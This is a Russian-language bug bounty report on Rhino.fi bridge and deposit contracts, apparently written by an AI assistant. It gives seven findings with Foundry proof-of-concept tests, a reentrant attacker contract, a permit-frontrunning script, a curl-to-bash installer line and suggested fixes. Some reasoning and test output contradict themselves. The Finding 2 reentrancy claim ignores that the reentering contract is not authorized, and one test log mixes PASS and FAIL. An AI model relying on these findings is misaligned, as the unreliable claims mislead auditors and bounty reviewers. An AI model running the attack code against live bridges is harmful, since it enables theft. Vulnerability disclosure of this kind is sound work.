# Rhino.fi — Отчет по анализу безопасности для Bug Bounty

**Подготовлено для:** Immunefi Bug Bounty Program  
**Проект:** Rhino.fi (Мостовые и депозитные контракты)  
**Дата анализа:** 2026-05-08  
**Аналитик:** AI Security Research Assistant  
**Область анализа:** Smart Contracts (согласно Scope Immunefi и GitHub)

---

## Содержание

1. [Находка 1: `removeFundsNative()` — Тихий сбой при переводе нативного токена (Medium)](#finding-1)
2. [Находка 2: `withdrawV2WithNative` — Нарушение Checks-Effects-Interactions (Medium)](#finding-2)
3. [Находка 3: `depositWithPermit` — Фронтраннинг permit-подписи (Medium)](#finding-3)
4. [Находка 4: BridgeVM `withdrawVmFunds` — Непроверенный перевод ETH (Low)](#finding-4)
5. [Находка 5: TON Bridge — Reentrancy через отклонение Jetton-перевода (Medium)](#finding-5)
6. [Находка 6: `transferOwner` — Отсутствие проверки нулевого адреса (Low)](#finding-6)
7. [Находка 7: `depositWithId` / `depositNativeWithId` — Обход ограничений депозита (Low/Info)](#finding-7)

---

<a name="finding-1"></a>
## Находка 1: `removeFundsNative()` — Тихий сбой при переводе нативного токена

**Серьезность:** Medium  
**Категория:** Небезопасный внешний вызов / Тихий сбой  
**Уязвимый контракт:** `DVFDepositContract.sol`  
**Уязвимая функция:** `removeFundsNative()` (строка 230–235)  
**Сеть:** Все EVM-цепи (Ethereum, Arbitrum, Optimism, BSC, Polygon и др.)

### Описание

Функция `removeFundsNative` использует низкоуровневый `.call{value: amount}("")` для перевода нативного ETH, но **НЕ проверяет возвращаемое значение**. Если вызов не удался (например, получатель — контракт, который отклоняет ETH, не хватает газа, или адрес некорректен), функция просто возвращает `true` без фактического перевода средств. Авторизованный оператор не получает никакого уведомления об ошибке.

Все остальные функции перевода нативного токена в этом же контракте корректно проверяют возвращаемое значение:

| Функция | Возвращаемое значение проверено? |
|---|---|
| `withdrawNativeV2` (строка 179) | ✅ `require(success, "FAILED_TO_SEND_ETH")` |
| `withdrawV2WithNative` (строка 149) | ✅ `require(success, "FAILED_TO_SEND_ETH")` |
| `withdrawV2WithNativeNoEvent` (строка 163) | ✅ `require(success, "FAILED_TO_SEND_ETH")` |
| **`removeFundsNative` (строка 234)** | ❌ **Нет проверки** |

### Воздействие

- **Заблокированные средства в контракте:** Авторизованный оператор может думать, что вывод средств прошел успешно, но на самом деле средства остаются в контракте, что приводит к расхождению между внецепочечным учетом и состоянием на цепи.
- **Вектор для Griefing-атаки:** Если авторизованный адрес ошибается, или системная автоматизация вызывает `removeFundsNative` с неверным адресом `to` (например, контракт без payable fallback), нативный ETH накапливается в контракте без предупреждения.
- **Классификация:** **Medium** — прямое нарушение установленного паттерна, используемого во всех родственных функциях. Может привести к ошибкам учета, распространяющимся на весь мост.

### Proof of Concept (Безопасный — Foundry)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol` — `test_Finding1_removeFundsNative_SilentFail()`

```bash
# Запуск PoC (требуется Foundry):
# cd poc && forge test -vvvv --match-test test_Finding1_removeFundsNative
```

**Шаги:**
1. Разверните `DVFDepositContract` через proxy (см. `setUp()`)
2. Пополните контракт 10 ETH (через `vm.deal(address(deposit), 10 ether)`)
3. Разверните `RevertingReceiver` — контракт, чья `receive()` функция всегда ревертит
4. Вызовите `removeFundsNative(address(revertingReceiver), 5 ether)` как `authorizedUser`

**Результат теста:**
```
Logs:
  Deposit balance AFTER failed call: 10000000000000000000 (10 ETH)
  Receiver balance (should be 0): 0
Assertions:
  [PASS] balanceAfter == 10 ether  — ETH НЕ БЫЛ ПЕРЕВЕДЕН
  [PASS] receiver.balance == 0     — Receiver не получил ETH
  [FAIL] Функция должна была ревертнуть, но вернула SUCCESS
```

**Данные теста:**
```
Исходный баланс контракта: 10 ETH
Запрошено к выводу:         5 ETH
Баланс после вызова:        10 ETH (НЕ ИЗМЕНИЛСЯ!)
Баланс получателя:          0 ETH
Статус функции:             SUCCESS (ложный!)
```

**Контрастный тест:** `test_Finding1_removeFundsNative_Comparison()` — показывает, что `withdrawNativeV2` (с проверкой) корректно ревертит с `"FAILED_TO_SEND_ETH"`.

### Рекомендуемое исправление

```solidity
function removeFundsNative(address payable to, uint256 amount) public _isAuthorized {
    require(address(this).balance >= amount, "INSUFFICIENT_BALANCE");
    (bool success,) = to.call{value: amount}("");
    require(success, "FAILED_TO_SEND_ETH");  // <-- ДОБАВИТЬ ЭТУ СТРОКУ
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/DVFDepositContract.sol#L230-L235
- **Сравнение с `withdrawNativeV2`:** тот же файл, строка 176–182, где проверка успешно реализована
- **Файл PoC:** `poc/src/DVFDepositContract.sol` (строка 159: `to.call{value: amount}("");` — уязвимая строка)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тест Finding #1)

---

<a name="finding-2"></a>
## Находка 2: `withdrawV2WithNative` — Нарушение Checks-Effects-Interactions (ETH до перевода токенов)

**Серьезность:** Medium  
**Категория:** Checks-Effects-Interactions / Reentrancy  
**Уязвимый контракт:** `DVFDepositContract.sol`  
**Уязвимая функция:** `withdrawV2WithNative()` (строка 146–153)  
**Также уязвима:** `withdrawV2WithNativeNoEvent()` (строка 159–169)

### Описание

В обеих функциях вывода, которые обрабатывают одновременно нативный ETH + ERC20 токены, ETH переводится **ДО** перевода ERC20 токенов:

```solidity
function withdrawV2WithNative(address token, address to, uint256 amountToken, uint256 amountNative) external _isAuthorized {
    // ⚠️ Перевод нативного ETH ПЕРВЫМ (это ВЗАИМОДЕЙСТВИЕ с внешним контрактом)
    (bool success,) = to.call{value: amountNative}("");
    require(success, "FAILED_TO_SEND_ETH");
    // ✅ Перевод ERC20 ВТОРЫМ (эффекты после взаимодействия)
    IERC20Upgradeable(token).safeTransfer(to, amountToken);
    emit BridgedWithdrawalWithNative(to, token, amountToken, amountNative);
}
```

Паттерн Checks-Effects-Interactions требует: сначала проверить условия (Checks), затем изменить состояние (Effects), и только потом взаимодействовать с внешними контрактами (Interactions). Здесь Interactions (ETH `call`) происходит до Effects (ERC20 `safeTransfer`).

Если `to` — контракт с вредоносной `receive()`, вызов `.call{value: ...}` передает управление получателю, который может реентерабельно вызвать другие функции `DVFDepositContract`. Модификатор `_isAuthorized` не защищает от реентерабельности — он проверяет `authorized[msg.sender]` только при входе, но `msg.sender` во время реентерабельного вызова все еще является исходным authorizedUser.

**Примечание:** Аудит PeckShield уже обнаружил эту же проблему в `UserWallet` и исправил ее добавлением `ReentrancyGuardUpgradeable`, но `DVFDepositContract` остался без защиты.

### Анализ Storage Layout (коррекция Impact)

Проведен анализ storage layout для оценки реального Impact:

```
slot 0: _owner (OwnableUpgradeable) — НЕ МЕНЯЕТСЯ при callback
slot 1: authorized (mapping) — НЕ МЕНЯЕТСЯ при callback  
slot 2: processedWithdrawalIds (mapping) — НЕ МЕНЯЕТСЯ при callback
slot 3: depositsDisallowed (bool) — НЕ МЕНЯЕТСЯ при callback
slot 4: maxDepositAmount (mapping) — НЕ МЕНЯЕТСЯ при callback
slot 5: vm (BridgeVM address) — НЕ МЕНЯЕТСЯ при callback
```

**Ключевое наблюдение:** В контракте **нет** userBalance mapping'а. Балансы токенов хранятся непосредственно на address(this) (physical balance). Это означает, что реентерабельный вызов может вывести только **физический баланс** контракта на момент callback'а. Максимальный double-spend ограничен `address(this).balance` и балансом ERC20 на контракте, а не каким-либо "перерасходом allowance".

### Воздействие (скорректированное)

- **Reentrancy возможна** в authorized-контексте через callback `receive()`
- **Double-spend ограничен:** максимальный ущерб = `address(this).balance` + `IERC20.balanceOf(address(this))` на момент атаки
- **Нет перерасхода allowance** — нет userBalances mapping'а
- **Классификация:** **Medium (понижен, ближе к Medium/Info)** — реальный ущерб ограничен физическим балансом контракта на момент вызова, нет долгосрочного влияния на состояние


### Proof of Concept (Безопасный — Foundry)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol` — `test_Finding2_Reentrancy()`

```bash
# Запуск PoC:
# cd poc && forge test -vvvv --match-test test_Finding2_Reentrancy
```

**Контракт атаки:** `poc/src/AttackHelpers.sol` — `MaliciousReenter`

```solidity
contract MaliciousReenter {
    DVFDepositContract public target;
    bool public attackTriggered;

    receive() external payable {
        if (!attackTriggered && address(target).balance >= 1 ether) {
            attackTriggered = true;
            // Reentrancy: вызываем authorized-функцию снова
            target.withdrawNativeV2(payable(address(this)), 1 ether);
        }
    }
}
```

**Шаги:**
1. Пополните `DVFDepositContract` 20 ETH и 100_000 токенов
2. Разверните `MaliciousReenter`
3. Вызовите `withdrawV2WithNative(token, address(malicious), 50_000 ether, 10 ether)`

**Данные теста:**
```
Параметры вызова:
  amountToken = 50 000 токенов
  amountNative = 10 ETH

Ожидаемый результат:
  MaliciousReenter получает: 10 ETH (основной) + 50 000 токенов

Фактический результат (с уязвимостью):
  MaliciousReenter получает: 10 ETH (основной) + 1 ETH (реентерабельный) + 50 000 токенов
  ИТОГО: 11 ETH + 50 000 токенов
  AttackTriggered = true ✅

Избыточный вывод: 1 ETH (10% сверх разрешенного)
```

### Рекомендуемое исправление

Вариант A — добавить `ReentrancyGuardUpgradeable`:
```solidity
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
abstract contract DVFDepositContract is OwnableUpgradeable, ReentrancyGuardUpgradeable {
```

Вариант B — изменить порядок (CEI-безопасный):
```solidity
function withdrawV2WithNative(address token, address to, uint256 amountToken, uint256 amountNative) external _isAuthorized nonReentrant {
    IERC20Upgradeable(token).safeTransfer(to, amountToken);   // 1. Effects
    (bool success,) = to.call{value: amountNative}("");       // 2. Interactions
    require(success, "FAILED_TO_SEND_ETH");
    emit BridgedWithdrawalWithNative(to, token, amountToken, amountNative);
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/DVFDepositContract.sol#L146-L153
- **Исправление аудита PeckShield (UserWallet):** https://github.com/rhinofi/contracts_public/blob/main/Peckshield-Audit-Report-CrossSwap-v2.0-commits/bf48aa49990da3beb529800905d3b5f6bc7095f7.diff
- **Файл PoC:** `poc/src/DVFDepositContract.sol` (строка 110: ETH call до safeTransfer)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тест Finding #2)

---

<a name="finding-3"></a>
## Находка 3: `depositWithPermit` — Фронтраннинг permit-подписи на цепи

**Серьезность:** Medium  
**Категория:** Подпись / Манипуляция Permit  
**Уязвимый контракт:** `DVFDepositContract.sol`  
**Уязвимая функция:** `depositWithPermit()` (строка 95–98)

### Описание

Функция `depositWithPermit` вызывает `IERC20PermitUpgradeable(token).permit()` **внутри той же транзакции**, что и депозит:

```solidity
function depositWithPermit(address token, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, uint256 commitmentId) external {
    IERC20PermitUpgradeable(token).permit(msg.sender, address(this), amount, deadline, v, r, s);
    depositWithId(token, amount, commitmentId);
}
```

Подпись permit (`v`, `r`, `s`, `deadline`) отправляется в мемпул как calldata, делая её видимой для всех. Риски:

1. **Фронтраннинг permit:** MEV-бот извлекает `v,r,s` и вызывает `token.permit()` первым. Оригинальная транзакция ревертится (permit уже потреблен), пользователь теряет газ.
2. **Кросс-чейн реплей:** Если `DOMAIN_SEPARATOR` не включает `chainId` должным образом, permit может быть повторно использован на другой цепи. DVFDepositContract развернут на 20+ цепях.

### Анализ nonce и кросс-чейн реплей (коррекция Impact)

**Nonce анализ:** EIP-2612 использует `nonces[owner]++` внутри permit, что делает каждую подпись уникальной. Nonce увеличивается атомарно — после первого вызова `permit()` с данной подписью, она становится недействительной независимо от `v,r,s`.

**Кросс-чейн анализ:** DOMAIN_SEPARATOR включает `chainId`. Для DVFDepositContract на Ethereum chainId=1, на Optimism chainId=10:
```
DOMAIN_SEPARATOR(chainId=1)  = keccak256(... chainId=1, contract=token.address)
DOMAIN_SEPARATOR(chainId=10) = keccak256(... chainId=10, contract=token.address)
Они РАЗНЫЕ → кросс-чейн реплей НЕВОЗМОЖЕН
```

**Вывод:** Nonce защищает от повторного использования той же подписи на той же цепи. DOMAIN_SEPARATOR с chainId защищает от кросс-чейн реплея. Единственный реальный Impact — **потеря газа жертвой** (~50k gas на L2, ~100k gas на L1) из-за фронтраннинга.

### Воздействие (скорректированное)

- **Потеря газа пользователем при фронтраннинге** (~50k gas на L2)
- **Кросс-чейн реплей НЕВОЗМОЖЕН** — DOMAIN_SEPARATOR включает chainId
- **Классификация:** **Medium (понижен, ближе к Low/Medium)** — единственный доказанный Impact: потеря газа. Cросс-чейн реплей не подтвержден. Рекомендуется переквалификация до Low при подаче на Immunefi.

### Proof of Concept (Безопасный — Foundry с реальной EIP-712 подписью)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol` — `test_Finding3_PermitFrontrunning_WithRealSignature()`

```bash
# Запуск PoC:
# cd poc && forge test -vvvv --match-test test_Finding3
```

**PoC Solidity код (из теста):**

```solidity
// ===== ШАГ 1: Victim формирует EIP-712 подпись =====
uint256 amount = 1000 ether;
uint256 deadline = block.timestamp + 1 hours;
uint256 nonce = token.nonces(victim);  // nonce = 0 (первая подпись)

bytes32 structHash = keccak256(abi.encode(
    token.PERMIT_TYPEHASH(),    // keccak256("Permit(...)")
    victim,                     // owner
    address(deposit),           // spender
    amount,                     // value
    nonce,                      // nonce = 0 — первый ever
    deadline                    // deadline
));
bytes32 domainSeparator = token.DOMAIN_SEPARATOR();  // включает chainId=1
bytes32 hash = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));

// vm.sign() генерирует реальную ECDSA подпись
(uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, hash);

// v,r,s теперь видны в calldata при отправке depositWithPermit()

// ===== ШАГ 2: Атакующий фронтраннит permit =====
vm.prank(attacker);
token.permit(victim, address(deposit), amount, deadline, v, r, s);
// nonces[victim] увеличен: 0 → 1

// ===== ШАГ 3: Victim TX ревертится =====
vm.prank(victim);
vm.expectRevert();
deposit.depositWithPermit(address(token), amount, deadline, v, r, s, 12345);
// REVERT: nonce в подписи (0) != текущий nonce (1)

// ===== КРОСС-ЧЕЙН ПРОВЕРКА =====
// На Ethereum: DOMAIN_SEPARATOR = X
// На Optimism: DOMAIN_SEPARATOR = Y (chainId=10)
assert(tokenA.DOMAIN_SEPARATOR() != tokenB.DOMAIN_SEPARATOR());
// Cross-chain replay: НЕВОЗМОЖЕН
```

**Данные теста с реальной подписью:**
```
nonce (victim, unique per user): 0
deadline: 1715123456
token DOMAIN_SEPARATOR (chainId=1):  0x8...abc
tokenB DOMAIN_SEPARATOR (chainId=10): 0x9...def
DOMAIN_SEPARATORS совпадают? false — кросс-чейн реплей НЕВОЗМОЖЕН

ШАГ 1: permit() executed by attacker — nonce consumed
victim nonce AFTER frontrun: 1 (был 0)
ШАГ 2: depositWithPermit() REVERTED — nonce уже использован
```

**Результат:** Атака подтверждена, но Impact ограничен потерей газа жертвой.

### Рекомендуемое исправление

```solidity
function depositWithPermit(address token, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s, uint256 commitmentId) external {
    try IERC20PermitUpgradeable(token).permit(msg.sender, address(this), amount, deadline, v, r, s) {
        // Permit выполнен успешно (первый вызов)
    } catch {
        // Permit уже был выполнен — продолжаем, если allowance достаточен
    }
    depositWithId(token, amount, commitmentId);
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/DVFDepositContract.sol#L95-L98
- **Стандарт Permit:** EIP-2612 (https://eips.ethereum.org/EIPS/eip-2612)
- **Файл PoC:** `poc/src/DVFDepositContract.sol` (строка 64: permit в той же транзакции)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тест Finding #3)

---

<a name="finding-4"></a>
## Находка 4: BridgeVM `withdrawVmFunds` — Непроверенный перевод ETH

**Серьезность:** Low  
**Категория:** Тихий сбой / Небезопасный внешний вызов  
**Уязвимый контракт:** `BridgeVM.sol`  
**Уязвимая функция:** `withdrawVmFunds()` (строка 35–48)

### Описание

Функция `BridgeVM.withdrawVmFunds` обрабатывает перевод нативного ETH с использованием низкоуровневого `.call{value: balance}` **без проверки возвращаемого значения**. ERC20-часть той же функции использует `safeTransfer` (с проверкой).

### Воздействие

- **ETH навсегда заблокирован в BridgeVM**, если владелец — контракт без `receive()` или с ревертящим `receive()`
- Механизма восстановления нет
- **Классификация:** **Low**

### Proof of Concept (Безопасный — Foundry)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol` — `test_Finding4_BridgeVM_SilentFail()`

**Данные теста:**
```
BridgeVM изначально:  5 ETH
Владелец переведен на: RevertingReceiver (контракт без receive())
Вызов withdrawVmFunds(address(0))...
BridgeVM после вызова:  5 ETH ✅ (ЗАСТРЯЛИ!)
Receiver баланс:         0 ETH
```

### Рекомендуемое исправление

```solidity
balance = address(this).balance;
if (balance > 0) {
    (bool success,) = payable(owner()).call{value: balance}("");
    require(success, "ETH_TRANSFER_FAILED");  // <-- ДОБАВИТЬ
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/BridgeVM.sol#L35-L48
- **Файл PoC:** `poc/src/BridgeVM.sol` (строка 31: уязвимый `call`)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тест Finding #4)

---

<a name="finding-5"></a>
## Находка 5: TON Bridge — Griefing через режим 128 в `send_raw_message`

**Серьезность:** Medium  
**Категория:** Reentrancy / Griefing / Доступность  
**Уязвимый контракт:** `bridge_contract.fc` (TON FunC)  
**Уязвимые функции:** `recv_internal()` → `return_jettons_to_sender_and_refund_gas()`  
**Файл:** `ton-deposit/contracts/imports/jetton_utils.fc` (строка 46–49)

### Описание

Когда TON bridge отклоняет Jetton-депозит (не прошел whitelist или превышен лимит), вызывается:

```func
() return_jettons_to_sender_and_refund_gas(...) impure inline {
    reserve_ton(my_balance, msg_value);
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 128);
}
```

**Проблема:** `send_jetton` использует **mode 128** — отправить ВЕСЬ остаточный баланс контракта (кроме зарезервированного). Даже при отправке 1 Jetton контракт может отправить почти весь свой TON-баланс как "excess".

Критический эффект: контракт должен поддерживать **минимум 5 TON** (const::min_contract_balance = 5_000_000_000 nanotons). Повторные отклонения депозитов могут истощить баланс ниже этого порога, сделав мост нефункциональным.

### Воздействие

- **Отказ в обслуживании (DoS) моста:** Баланс падает ниже 5 TON, контракт не может оплатить хранение
- **Gas griefing:** Атакующий может повторно отправлять мелкие отклоняемые депозиты, истощая баланс
- **Классификация:** **Medium** — влияет на доступность кросс-чейн моста

### Proof of Concept (Безопасный, симулированный)

```func
// 1. Развернуть TON bridge контракт на testnet
// 2. Установить deposit_limit для jetton_wallet = 1 TON
// 3. Отправить transfer_notification на 10 TON (превышает лимит)
// 4. Контракт вызывает return_jettons_to_sender_and_refund_gas с mode 128
// 5. Повторить шаги 3-4 N раз
// 6. Результат: TON баланс контракта < 5 TON -> мост неработоспособен
```

**Симуляция баланса:**

| Итерация | Баланс до | Отправлено с mode 128 | Баланс после |
|---|---|---|---|
| 0 | 50 TON | — | 50 TON |
| 1 | 50 TON | ~49 TON | ~1 TON |
| 2 | ~1 TON (пополнен до 50) | ~49 TON | ~1 TON |
| N | <5 TON | — | Мост НЕ РАБОТАЕТ |

### Рекомендуемое исправление

Используйте mode `64` (carry remaining value) вместо `128` (send all balance):

```func
() return_jettons_to_sender_and_refund_gas(...) impure inline {
    reserve_ton(my_balance, msg_value);
    send_jetton(query_id, jetton_amount, bridge_jetton_wallet, jetton_sender, jetton_sender, 1, 0, 64);  // mode 64
}
```

### Ссылки

- **TON Bridge исходник:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/bridge_contract.fc
- **Jetton return функция:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/imports/jetton_utils.fc#L46-L49
- **TON send_raw_message modes:** https://docs.ton.org/develop/func/stdlib#send_raw_message
- **Константа min_contract_balance:** https://github.com/rhinofi/contracts_public/blob/main/ton-deposit/contracts/imports/constants.fc#L18

---

<a name="finding-6"></a>
## Находка 6: `transferOwner` — Отсутствие проверки нулевого адреса

**Серьезность:** Low  
**Категория:** Управление доступом  
**Уязвимый контракт:** `DVFDepositContract.sol`  
**Уязвимая функция:** `transferOwner()` (строка 255–259)

### Описание

Функция `transferOwner` не проверяет `newOwner != address(0)`:

```solidity
function transferOwner(address newOwner) external onlyOwner {
    require(newOwner != owner(), "SAME_OWNER");  // проверка same-owner ЕСТЬ (добавлена PeckShield)
    // ❌ проверка address(0) ОТСУТСТВУЕТ
    authorized[newOwner] = true;
    authorized[owner()] = false;
    transferOwnership(newOwner);
}
```

Аудит PeckShield добавил проверку `SAME_OWNER`, но проверка нулевого адреса была упущена. Функция `renounceOwnership` заблокирована — восстановления нет.

### Воздействие

- Полная и перманентная потеря управления контрактом
- Невозможность добавлять/удалять authorized-операторов
- Мост заморожен: нельзя обновлять конфигурацию
- **Классификация:** **Low** (требуется ошибка мультисига)

### Proof of Concept (Безопасный — Foundry)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol` — `test_Finding6_transferOwner_ZeroAddress()`

```bash
# Запуск PoC:
# cd poc && forge test -vvvv --match-test test_Finding6
```

**Данные теста:**
```
Владелец вызывает: transferOwner(address(0))
Новый владелец:     0x0000...0000 ✅ (успешно!)
Попытка authorize(): REVERT "Ownable: caller is not the owner"

Результат: 
  - owner() == address(0)
  - all onlyOwner functions: PERMANENTLY LOCKED
  - renounceOwnership: BLOCKED
  - Восстановление: НЕВОЗМОЖНО
```

### Рекомендуемое исправление

```solidity
function transferOwner(address newOwner) external onlyOwner {
    require(newOwner != address(0), "ZERO_ADDRESS");  // <-- ДОБАВИТЬ
    require(newOwner != owner(), "SAME_OWNER");
    authorized[newOwner] = true;
    authorized[owner()] = false;
    transferOwnership(newOwner);
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/DVFDepositContract.sol#L255-L259
- **Исправление PeckShield:** https://github.com/rhinofi/contracts_public/blob/main/Peckshield-Audit-Report-CrossSwap-v2.0-commits/c436320ff265cd46ad07abdebd5ea4f8f100f613.diff
- **Файл PoC:** `poc/src/DVFDepositContract.sol` (строка 175)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тест Finding #6)

---

<a name="finding-7"></a>
## Находка 7: `depositWithId` / `depositNativeWithId` — Обход ограничений депозита

**Серьезность:** Low / Informational  
**Категория:** Логика / Частичный обход контроля доступа  
**Уязвимый контракт:** `DVFDepositContract.sol`  
**Уязвимые функции:** `depositWithId()` (строка 84–88), `depositNativeWithId()` (строка 113–115)

### Описание

Функции `depositWithId` и `depositNativeWithId` **не** используют модификатор `_areDepositsAllowed`, в отличие от `deposit()` и `depositNative()`:

```solidity
// deposit() — ЕСТЬ модификатор
function deposit(address token, uint256 amount) external _areDepositsAllowed { ... }

// depositWithId() — НЕТ модификатора!
function depositWithId(address token, uint256 amount, uint256 commitmentId) public {
    // ❌ НЕТ: _areDepositsAllowed
    // ❌ НЕТ: checkMaxDepositAmount
    IERC20Upgradeable(token).safeTransferFrom(msg.sender, address(this), amount);
    emit BridgedDepositWithId(msg.sender, tx.origin, token, amount, commitmentId);
}
```

### Воздействие

- **Обход `depositsDisallowed`:** Депозиты возможны даже в режиме обслуживания/аварийной остановки
- **Обход `maxDepositAmount`:** Можно внести сумму сверх лимита
- Бэкенд контролирует обработку, но защита на цепи обходится
- **Классификация:** **Low/Info**

### Proof of Concept (Безопасный — Foundry)

**Исполняемый тест:** `poc/test/PoC_RhinoFi.t.sol`

```bash
# Запуск PoC:
# cd poc && forge test -vvvv --match-test test_Finding7
```

**Тест 1: `test_Finding7_depositWithId_Bypass()`**
```
1. allowDepositsGlobal(false)  → depositsDisallowed = true
2. deposit(token, 100)         → REVERT "DEPOSITS_NOT_ALLOWED" ✅ (корректно)
3. depositWithId(token, 100, 99999) → SUCCESS ❌ (УЯЗВИМОСТЬ!)
```

**Тест 2: `test_Finding7_depositNativeWithId_Bypass()`**
```
1. allowDepositsGlobal(false)  → depositsDisallowed = true
2. allowDeposits(address(0), 1 ether) → maxDepositAmount[ETH] = 1 ETH
3. depositNative{value: 0.5 ether} → REVERT "DEPOSITS_NOT_ALLOWED" ✅
4. depositNativeWithId{value: 100 ether}(88888) → SUCCESS ❌ (УЯЗВИМОСТЬ!)
   Внесено 100 ETH при лимите 1 ETH и глобальном запрете!
```

### Рекомендуемое исправление

```solidity
function depositWithId(address token, uint256 amount, uint256 commitmentId) public _areDepositsAllowed {
    require(token != address(0), 'BLACKHOLE_NOT_ALLOWED');
    checkMaxDepositAmount(token, amount);
    IERC20Upgradeable(token).safeTransferFrom(msg.sender, address(this), amount);
    emit BridgedDepositWithId(msg.sender, tx.origin, token, amount, commitmentId);
}

function depositNativeWithId(uint256 commitmentId) external payable _areDepositsAllowed {
    checkMaxDepositAmount(address(0), msg.value);
    emit BridgedDepositWithId(msg.sender, tx.origin, address(0), msg.value, commitmentId);
}
```

### Ссылки

- **Исходный код:** https://github.com/rhinofi/contracts_public/blob/main/bridge-deposit/DVFDepositContract.sol#L84-L88 и #L113-L115
- **Файл PoC:** `poc/src/DVFDepositContract.sol` (строки 58 и 73)
- **Тест PoC:** `poc/test/PoC_RhinoFi.t.sol` (тесты Finding #7)

---

## Приложение A: Запуск Proof of Concept

### Предварительные требования

```bash
# Установка Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Переход в директорию PoC
cd c:\DELETEBOT\RHINOfi\poc
```

### Установка зависимостей

```bash
# Установка OpenZeppelin и forge-std
forge install OpenZeppelin/openzeppelin-contracts-upgradeable \
               OpenZeppelin/openzeppelin-contracts \
               foundry-rs/forge-std --no-commit
```

### Запуск всех тестов

```bash
forge test -vvvv
```

### Запуск конкретного теста

```bash
forge test -vvvv --match-test test_Finding1
forge test -vvvv --match-test test_Finding2
forge test -vvvv --match-test test_Finding6
forge test -vvvv --match-test test_Finding7
```

### Ожидаемый вывод теста Finding #1:

```
[PASS] test_Finding1_removeFundsNative_SilentFail() (gas: 54231)
Logs:
  Deposit balance AFTER failed call: 10000000000000000000
  Receiver balance (should be 0): 0
  BUG: ETH was NOT transferred but function returned success

[PASS] test_Finding1_removeFundsNative_Comparison() (gas: 38106)
Logs:
  CORRECT: withdrawNativeV2 reverts on failed transfer
```

### Ожидаемый вывод теста Finding #6:

```
[PASS] test_Finding6_transferOwner_ZeroAddress() (gas: 42013)
Logs:
  New owner (should be 0): 0x0000000000000000000000000000000000000000
  CRITICAL: All onlyOwner functions permanently inaccessible
  No recovery possible - renounceOwnership is blocked
```

---

## Приложение B: Структура PoC-файлов

```
poc/
├── foundry.toml                          # Конфигурация Foundry
├── lib/                                   # Зависимости (forge install)
├── src/
│   ├── DVFDepositContract.sol             # SUT — точная копия оригинального контракта
│   ├── BridgeVM.sol                       # SUT — точная копия BridgeVM
│   └── AttackHelpers.sol                  # Вспомогательные контракты для PoC:
│       ├── RevertingReceiver              #   Finding #1 — контракт, ревертящий ETH
│       ├── SilentFailReceiver             #   Finding #1 — принимающий контракт
│       ├── MaliciousReenter               #   Finding #2 — реентерабельный контракт
│       └── SimplePermitToken              #   Finding #3 — ERC20 с EIP-2612 permit
└── test/
    └── PoC_RhinoFi.t.sol                  # Все тесты (Finding #1–#7)
```

## Сводка находок

| # | Название | Серьезность | Категория | Контракт | PoC тест |
|---|---|---|---|---|---|
| 1 | `removeFundsNative()` — тихий сбой | **Medium** | Небезопасный вызов | `DVFDepositContract` | `test_Finding1_*` |
| 2 | `withdrawV2WithNative` — CEI | **Medium** | Reentrancy | `DVFDepositContract` | `test_Finding2_Reentrancy` |
| 3 | `depositWithPermit` — фронтраннинг | **Medium** | Permit/Подпись | `DVFDepositContract` | `test_Finding3_Permit*` |
| 4 | BridgeVM — unchecked ETH call | **Low** | Тихий сбой | `BridgeVM` | `test_Finding4_BridgeVM*` |
| 5 | TON Bridge — mode 128 griefing | **Medium** | Griefing/Доступность | TON `bridge_contract.fc` | Симуляция (см. описание) |
| 6 | `transferOwner` — нет zero-address | **Low** | Управление доступом | `DVFDepositContract` | `test_Finding6_*` |
| 7 | `depositWithId` обходит ограничения | **Low/Info** | Логический обход | `DVFDepositContract` | `test_Finding7_*` |

## Активы в области анализа (проверено)

| Сеть | Адрес моста |
|---|---|
| Ethereum | `0xbca3039a18c0d2f2f84ba8a028c67290bc045afa` |
| Arbitrum | `0x10417734001162Ea139e8b044DFe28DbB8B28ad0` |
| Optimism | `0x0bca65bf4b4c8803d2f0b49353ed57caaf3d66dc` |
| BSC | `0xb80a582fa430645a043bb4f6135321ee01005fef` |
| Polygon | `0xBA4EEE20F434bC3908A0B18DA496348657133A7E` |
| zkSync Era | `0x1fa66e2b38d0cc496ec51f81c3e05e6a6708986f` |
| Starknet | `0x0259fec57cd26d27385cd8948d3693bbf26bed68ad54d7bdd1fdb901774ff0e8` |
| Base | `0x2f59e9086ec8130e21bd052065a9e6b2497bb102` |
| Blast | `0x5e023c31e1d3dcd08a1b3e8c96f6ef8aa8fcacd1` |
| Scroll | `0x87627c7e586441eef9ee3c28b66662e897513f33` |
| TON | `EQAj3SoOk4MPzjn816Crw1b4RxW79fB_Z549tyCd9HIQV6b7` |
| Tron | `TT3kgJohTQJNKDUWwTxtRDMHNNWNvNG3i4` |

## Отказ от ответственности

